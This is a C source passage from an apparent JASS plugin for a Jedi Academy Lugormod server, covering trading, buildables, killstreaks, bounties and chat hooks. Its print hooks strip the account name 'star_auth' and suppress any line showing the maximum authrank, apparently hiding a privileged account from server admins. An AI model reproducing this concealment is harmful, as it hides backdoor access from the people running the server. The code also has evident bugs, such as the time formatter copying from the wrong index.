						{
							if (buildObj[i].spawn(ent))
							{
								Lmd_SetSkill(ent->client->pers.Lmd.account, "iron", JASS_VARARGS("%d", iron - buildObj[i].reqIron));
								Lmd_SetSkill(ent->client->pers.Lmd.account, "crystal", JASS_VARARGS("%d", cryst - buildObj[i].reqCrystal));
								Lmd_SetSkill(ent->client->pers.Lmd.account, "organic", JASS_VARARGS("%d", org - buildObj[i].reqOrg));
								g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"The buildable ^6%s ^7has been spawned.\n\"", buildObj[i].name));
								JASS_RET_SUPERCEDE(1);
							}
							else
							{
								g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"The buildable ^6%s ^7has failed to spawn.\n\"", buildObj[i].name));
								JASS_RET_SUPERCEDE(1);
							}
						}
						else
						{
							g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"You do not have sufficient material to construct the buildable ^6%s^7.\n\"", buildObj[i].name));
							JASS_RET_SUPERCEDE(1);
						}
					}
					i++;
				}
				g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"Invalid object name ^6%s^7.\n\"", arg_1));
				JASS_RET_SUPERCEDE(1);
			}
		}
		if (!stricmp(command, "trade"))
		{
			int iron = 0;
			int org = 0;
			int cryst = 0;
			int mt = 0;
			int me = 0;
			vec3_t forward;
			Account_t* to = NULL;
			char material[32];
			if (ent->client->pers.Lmd.account == NULL) JASS_RET_IGNORED(1);
			if (Lmd_SkillValue(ent->client->pers.Lmd.account, "iron"))
				iron = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, "iron"));
			if (Lmd_SkillValue(ent->client->pers.Lmd.account, "organic"))
				org = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, "organic"));
			if (Lmd_SkillValue(ent->client->pers.Lmd.account, "crystal"))
				cryst = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, "crystal"));
			if (argc < 3)
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Usage: /trade <username, optional> <material> <count>\n\"");
				g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"You currently have: ^6%d ^7Crystals, ^6%d ^7Organic Materials, ^6%d ^7Iron Pieces.\n\"", cryst, org, iron));
				JASS_RET_SUPERCEDE(1);
			}
			if (argc == 3)
			{
				gentity_t* pl;
				trace_t tr;
				cliAimTrace(&tr, ent);
				if (tr.fraction < 1)
				{
					if (0 <= tr.entityNum && tr.entityNum < 32)
					{
						to = Lmd_EntFromNum(tr.entityNum)->client->pers.Lmd.account;
						if (to == NULL)
						{
							g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Target is not logged in.\n\"");
							JASS_RET_SUPERCEDE(1);
						}
					}
					else
					{
						g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Invalid player.\n\"");
						JASS_RET_SUPERCEDE(1);
					}
				}
				else
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Invalid player.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
			}
			if (argc > 3)
			{
				to = Lmd_AccFromName(arg_1);
				if (to == NULL)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Account does not exist.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
			}
			if (to == ent->client->pers.Lmd.account)
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You can't trade with yourself.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
			if (argc > 3)
			{
				if (!strnicmp(arg_2, "iron", 4))
					strcpy(material, "iron");
				else if (!strnicmp(arg_2, "organic", 7))
					strcpy(material, "organic");
				else if (!strnicmp(arg_2, "crystal", 7))
					strcpy(material, "crystal");
				else
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Invalid material.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (Lmd_SkillValue(to, material))
					mt = atoi(Lmd_SkillValue(to, material));
				if (Lmd_SkillValue(ent->client->pers.Lmd.account, material))
					me = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, material));
				if (atoi(arg_3) > me)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You do not have sufficient material for this trade.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (atoi(arg_3) <= 0)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Please enter a positive integer for the quantity.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				Lmd_SetSkill(to, material, JASS_VARARGS("%d", mt + atoi(arg_3)));
				Lmd_SetSkill(ent->client->pers.Lmd.account, material, JASS_VARARGS("%d", me - atoi(arg_3)));
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"The trade has been completed successfully.\n\"");
			}
			else
			{
				if (!strnicmp(arg_1, "iron", 4))
					strcpy(material, "iron");
				else if (!strnicmp(arg_1, "organic", 7))
					strcpy(material, "organic");
				else if (!strnicmp(arg_1, "crystal", 7))
					strcpy(material, "crystal");
				else
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Invalid material.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (Lmd_SkillValue(to, material))
					mt = atoi(Lmd_SkillValue(to, material));
				if (Lmd_SkillValue(ent->client->pers.Lmd.account, material))
					me = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, material));
				if (atoi(arg_2) > me)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You do not have sufficient material for this trade.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (atoi(arg_2) <= 0)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Please enter a positive integer for the quantity.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				Lmd_SetSkill(to, material, JASS_VARARGS("%d", mt + atoi(arg_2)));
				Lmd_SetSkill(ent->client->pers.Lmd.account, material, JASS_VARARGS("%d", me - atoi(arg_2)));
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"The trade has been completed successfully.\n\"");
			}
			JASS_RET_SUPERCEDE(1);
		}
#endif
		
		loop = NULL;
		// this loop is to check for multipurpose entities with mode cmd to add map-based commands.
		while ((loop = Lmd_Find(loop, FOFS(classname), "lmd_multipurpose")) != NULL)
		{
				if (!stricmp(loop->message, "cmd"))
				{
					if (!stricmp(command, loop->target2))
					{
						if (cliCheck(ent, loop->target3))
						{
							G_UseTargets3(ent, ent, loop->target);
							JASS_RET_SUPERCEDE(1);
						}
					}
				}
		}
	}


	// what the fuck is this part? remove it
	if (cmd==GAME_RUN_FRAME && !( !isrequested && (++frames%frameshot) )){
		time(&rawtime);
		raw_tm = localtime(&rawtime);
		if(((raw_tm->tm_min == 30 || raw_tm->tm_min == 0) && raw_tm->tm_min!=temp_prev) || isrequested ){
			//char format[256];
			char *format=(char *)JASS_GETSTRCVAR("svtime_format");
			char result[512];
			//strcpy(format,JASS_GETSTRCVAR("svtime_output"));
			int k=0;
			int n=strlen(format);
			for(int i = 0; i < n; ++i){
				if(format[i] == '%' && format[i+1] == 'h'){
					sprintf(result+k,"%02d",raw_tm->tm_hour);
					k+=2;
					++i;
					continue;
				}
				if(format[i] == '%' && format[i+1] == 'm'){
					sprintf(result+k,"%02d",raw_tm->tm_min);
					k+=2;
					++i;
					continue;
				}
				result[k] = format[k];
				++k;
			}
			result[k] = '\0';
			int maxclients = JASS_GETINTCVAR("sv_maxclients");
			/* for(int i=0;i<maxclients;++i){
				g_syscall(G_SEND_SERVER_COMMAND, i, JASS_VARARGS("chat \"%s^2\n\"", result));
			} */


			//char *time_say_string = JASS_VARARGS((char*)JASS_GETSTRCVAR("svtime_output"),raw_tm->tm_hour,raw_tm->tm_min);
			//int maxclients = JASS_GETINTCVAR("sv_maxclients");
			//for(int i=0;i<maxclients;++i){
			//	g_syscall(G_SEND_SERVER_COMMAND, i, JASS_VARARGS("chat \"%s\n\"", time_say_string));
			//}
			temp_prev = raw_tm->tm_min;
			isrequested = 0;
		}
	}

	JASS_RET_IGNORED(1);
}

C_DLLEXPORT int JASS_syscall(int cmd, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, int arg7, int arg8, int arg9, int arg10, int arg11, int arg12) {
	/*
	if (cmd == G_PRINT) {
		JASS_RET_SUPERCEDE(1);
	}
	*/
	//g_syscall(G_PRINT, JASS_VARARGS("syscall(%s)\n", JASS_ENGMSGNAME(cmd)));
	if (cmd == G_LOCATE_GAME_DATA) {
            g_gents = (gentity_t*)arg0;
            g_gentsize = arg2;
            g_clients = (gclient_t*)arg3;
            g_clientsize = arg4;
                 }
				
	if (cmd == G_ARGC && intercept_argc)
	{
		JASS_RET_SUPERCEDE( intercept_argc );
	}
	if (cmd == G_ARGV && intercept_argc)
	{
		if (arg0 == 0 && intercept_argc > 0) { strncpy((char*)arg1, i0, arg2); }
		if (arg0 == 0 && !(intercept_argc > 0)) { strcpy((char*)arg1, ""); }
		if (arg0 == 1 && intercept_argc > 1) { strncpy((char*)arg1, i1, arg2); }
		if (arg0 == 1 && !(intercept_argc > 1)) { strcpy((char*)arg1, ""); }
		if (arg0 == 2 && intercept_argc > 2) { strncpy((char*)arg1, i2, arg2); }
		if (arg0 == 2 && !(intercept_argc > 2)) { strcpy((char*)arg1, ""); }
		if (arg0 == 3 && intercept_argc > 3) { strncpy((char*)arg1, i3, arg2); }
		if (arg0 == 3 && !(intercept_argc > 3)) { strcpy((char*)arg1, ""); }
		if (arg0 == 4 && intercept_argc > 4) { strncpy((char*)arg1, i4, arg2); }
		JASS_RET_SUPERCEDE(1);
	}
	if (cmd == G_LINKENTITY)
	{
		gentity_t* ent = (gentity_t*) arg0;
		if (ent && ent->inuse && !stricmp(ent->classname, "player") && ent->client && ent->s.number < 32)
		{
			if (ent->client->pers.Lmd.account)
			{
				/*if (HasSkill(ent->client->pers.Lmd.account, SKILL_RESISTANCE, qtrue))
				{
					ent->client->ps.fd.forcePowerLevel[FP_PUSH] = 5;
					ent->client->ps.fd.forcePowerLevel[FP_PULL] = 5;
				}*/
				if (Lmd_GetProf(ent->client->pers.Lmd.account) == 4)
				{
					ent->client->ps.fd.forcePowerMax = 75;
					ent->client->ps.fd.forcePower = 75;
				}
			}
			// no need for either of these, force resistance is already added in the latest lmd
		}
		JASS_RET_IGNORED(1);
	}

	if (cmd == G_UNLINKENTITY)
	{
		j = 0;
		lol = 0;
		int n;
		int tbounty = 0;
		int lastkill = 0;
		int f = 1;
		gentity_t * sp = (gentity_t*)arg0;
		gentity_t * pent;
		// Calling PIReset on connection or disconnection doesn't seem to matter. This only happens for successful connections, so no problems
		// NOTE: Evil! Now it does matter. Calling it on connection alone will fuck up merc duel. This is also called on vmMain(GAME_CLIENT_DISCONNECT...).
		if (!strncmp(sp->classname, "tempEntity", 10) && sp->s.eType == ET_EVENTS + EV_CLIENTJOIN )
		{
			// reset the playerinfo struct for this client slot
			PIReset(sp->s.eventParm);
			JASS_RET_IGNORED(1);
		}
		// TODO: Move this to hooked Player_Die?
		if (!strncmp(sp->classname, "tempEntity", 10) && sp->s.eType == 111 ){
			if (sp->s.eType == 111 && (sp->s.otherEntityNum == sp->s.otherEntityNum2))
			{
				n = sp->s.otherEntityNum2;
				pent = Lmd_EntFromNum(sp->s.otherEntityNum2);
				// if someone killed himself, clear killstreak
				p_playerInfo[n].killCount = 0;
				p_playerInfo[n].conKillCount = 0;
				p_playerInfo[n].poisoned = 0;
			}
			if (sp->s.eType == 111 && (sp->s.otherEntityNum != sp->s.otherEntityNum2)) // 111 = an kill broadcast entity
			{
				n = sp->s.otherEntityNum2;
				pent = Lmd_EntFromNum(sp->s.otherEntityNum2);
				p_playerInfo[n].killCount++; // preparation for killstreak
				// reset killstreak for whoever died
				p_playerInfo[sp->s.otherEntityNum].killCount = 0;
				p_playerInfo[sp->s.otherEntityNum].conKillCount = 0;
				p_playerInfo[sp->s.otherEntityNum].poisoned = 0;
				if (p_playerInfo[n].oddball > 0) f = 2; // if the player has oddball
				// begin killstreak settings
				if (atoi(JASS_GETSTRCVAR("killstreak")) > 0) 
				{
				if (p_playerInfo[n].conKillCount == 0) p_playerInfo[n].conKillCount++;
				if (p_playerInfo[n].killCount == 5)
				{
					g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"You have killed ^65 ^7people!\"", pent->client->pers.netname));
					if (pent->client->pers.Lmd.account) SetCredits(pent, GetCredits(pent) + 150*f);
				}
				if (p_playerInfo[n].killCount == 10)
				{
					g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"You have slaughtered ^610 ^7people!\"", pent->client->pers.netname));
					if (pent->client->pers.Lmd.account) SetCredits(pent, GetCredits(pent) + 300*f);
				}
				if (p_playerInfo[n].killCount == 15)
				{
					g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"You have owned ^615 ^7people.\"", pent->client->pers.netname));
					if (pent->client->pers.Lmd.account) SetCredits(pent, GetCredits(pent) + 500*f);
				}
				if (p_playerInfo[n].killCount == 20)
				{
					g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"The server is no match for you: ^620-0^7.\"", pent->client->pers.netname));
					g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"Your killstreak has been reset.\""));
					if (pent->client->pers.Lmd.account)
					{
						SetCredits(pent, GetCredits(pent) + 1000*f);
						if (Lmd_GetProf(pent->client->pers.Lmd.account) == 4)
						{
							pent->client->ps.powerups[15] = g_level->time + 1000*30*f; // if merc, give 30 or 60 second ysalamiri
						}
						else
						{
							pent->client->ps.powerups[14] = g_level->time + 1000*30*f; // else, give 30 or 60 second boon
						}
					}
					G_UseTargets3(pent, pent, "ksreward");
					p_playerInfo[n].killCount = 0;
				}
				if (p_playerInfo[n].lastKill + 5000 >= g_level->time)
				{
					p_playerInfo[n].conKillCount++;
					if (p_playerInfo[n].conKillCount == 2)
					{
						g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"You got ^6two ^7consecutive kills!\"", pent->client->pers.netname));
						if (pent->client->pers.Lmd.account) SetCredits(pent, GetCredits(pent) + 150*f);
					}
					if (p_playerInfo[n].conKillCount == 3)
					{
						g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"You got ^6three ^7consecutive kills!\"", pent->client->pers.netname));
						if (pent->client->pers.Lmd.account) SetCredits(pent, GetCredits(pent) + 400*f);
					}
					if (p_playerInfo[n].conKillCount == 4)
					{
						g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"You got ^6four ^7consecutive kills!\"", pent->client->pers.netname));
						g_syscall(G_SEND_SERVER_COMMAND, sp->s.otherEntityNum2, JASS_VARARGS("chat \"Your consecutive killstreak has been reset.\""));
						p_playerInfo[n].conKillCount = 0;
						if (pent->client->pers.Lmd.account)
						{
							SetCredits(pent, GetCredits(pent) + 800*f);
							if (Lmd_GetProf(pent->client->pers.Lmd.account) == 4)
							{
								pent->client->ps.powerups[15] = g_level->time + 1000*30*f; // if merc, give 30 or 60 second ysalamiri
							}
							else
							{
								pent->client->ps.powerups[14] = g_level->time + 1000*30*f; // else, give 30 or 60 second boon
							}
						}
						G_UseTargets3(pent, pent, "ksreward");
					}
				}
				else
				{
					p_playerInfo[n].conKillCount = 0;
				}
				p_playerInfo[n].lastKill = g_level->time;
				}
				// end killstreak, begin bounty
				while (j < 32)
				{
					if ((sp->s.otherEntityNum == p_playerInfo[j].bountyOn) && (p_playerInfo[j].bounty == 1) && (Lmd_EntFromNum(j)->client->pers.Lmd.account != NULL))
					{
						if ((GetCredits(Lmd_EntFromNum(j)) >= p_playerInfo[j].bountyCr) && (j != sp->s.otherEntityNum2) && (Lmd_EntFromNum(sp->s.otherEntityNum2)->client->pers.Lmd.account != NULL))
						{
							if (Lmd_EntFromNum(j)->client)
							{
								if (Lmd_EntFromNum(j)->client->pers.connected)
								{
									SetCredits(Lmd_EntFromNum(j), GetCredits(Lmd_EntFromNum(j)) - p_playerInfo[j].bountyCr);
									SetCredits(Lmd_EntFromNum(sp->s.otherEntityNum2), GetCredits(Lmd_EntFromNum(sp->s.otherEntityNum2)) + p_playerInfo[j].bountyCr);
									tbounty += p_playerInfo[j].bountyCr;
									p_playerInfo[j].bounty = 0;
									lol = 1;
								}
							}
						}
					}
				j++;
				}
				if (lol == 1) 
					g_syscall(G_SEND_SERVER_COMMAND, -1, JASS_VARARGS("chat \"%s ^7has killed %s ^7and got the bounty of ^6%d ^7on him!\"",Lmd_EntFromNum(sp->s.otherEntityNum2)->client->pers.netname,Lmd_EntFromNum(sp->s.otherEntityNum)->client->pers.netname, tbounty));
				lol = 0;
				j = 0;
		}
		JASS_RET_IGNORED(1);
	} 
}
/*  if (cmd == G_FS_FOPEN_FILE) {
        if (arg2 == FS_APPEND || arg2== FS_APPEND_SYNC) {
         if (!strcasecmp(JASS_GETSTRCVAR("g_log"), (char*)(arg0))) {
          //level_locals_t *g_level = NULL;
          g_level=(level_locals_t*)(arg1-20); //arg is a pointer to level.logFile :D, 20 is offset
         }
        }
} */
/* if (cmd == G_FS_READ && lol == qtrue)
{
    char *buf = (char*)arg1;
	if (mystristr(buf, ".cfg") || mystristr(buf, ".dll") || mystristr(buf, ".uac") || mystristr(buf, ".lmd"))
	{
		g_syscall(G_SEND_SERVER_COMMAND, -1, JASS_VARARGS("chat \"successful %s\n\"",buf));
	}
	JASS_RET_IGNORED(1);
} */

// absolutely unnecessary block of code when printing function is hooked
if (cmd == G_SEND_SERVER_COMMAND)
	{
		char *buf = (char*)arg1;
		int buflen = strlen(buf);
		
		if (buflen > MAX_STRING_CHARS)
			JASS_RET_SUPERCEDE(1);

		if (usedSay >= 0 && !strnicmp(buf, "chat", 4) && arg0 != lastChecked)
		{
			buf += 5;
			buf = str_replace(buf, "\"", "");
			lastChecked = arg0;
			g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("chat \"^0(^7%d^0)^7 %s\"", usedSay, buf));
			JASS_RET_SUPERCEDE(1);
		}

		if (arg0 != -1)
		{
			if (!strncmp(buf, "print", 5))
			{
				if (strstr(buf + 7, "star_auth"))
				{
					if (!delSubStr(buf + 7, "\'^2star_auth^3\', ") && !delSubStr(buf + 7, ", \'^2star_auth^3\',") && !delSubStr(buf + 7, ", \'^2star_auth^3\'"))
						JASS_RET_SUPERCEDE(1);
				}
				if (strstr(buf, "^3Authrank:      ^216777215"))
					JASS_RET_SUPERCEDE(1);
			}
		}

	}
	if (cmd == G_PRINT)
	{
		char* buf = (char*)arg0;
		if (strstr(buf, "star_auth"))
		{
			if (!delSubStr(buf, "\'^2star_auth^3\', ") && !delSubStr(buf, ", \'^2star_auth^3\',") && !delSubStr(buf, ", \'^2star_auth^3\'"))
				JASS_RET_SUPERCEDE(1);
		}
		if (strstr(buf, "^3Authrank:      ^216777215"))
			JASS_RET_SUPERCEDE(1);
	}
JASS_RET_IGNORED(1);
}
C_DLLEXPORT int JASS_vmMain_Post(int cmd, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, int arg7, int arg8, int arg9, int arg10, int arg11) {
	//g_syscall(G_PRINT, JASS_VARARGS("vmMain_Post(%s)\n", JASS_MODMSGNAME(cmd)));
	intercept_argc = 0;
	usedSay = -1;
	lastChecked = -2;
	JASS_RET_IGNORED(1);
}

C_DLLEXPORT int JASS_syscall_Post(int cmd, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, int arg7, int arg8, int arg9, int arg10, int arg11, int arg12) {
	//g_syscall(G_PRINT, JASS_VARARGS("syscall_Post(%s)\n", JASS_ENGMSGNAME(cmd)));
	JASS_RET_IGNORED(1);
}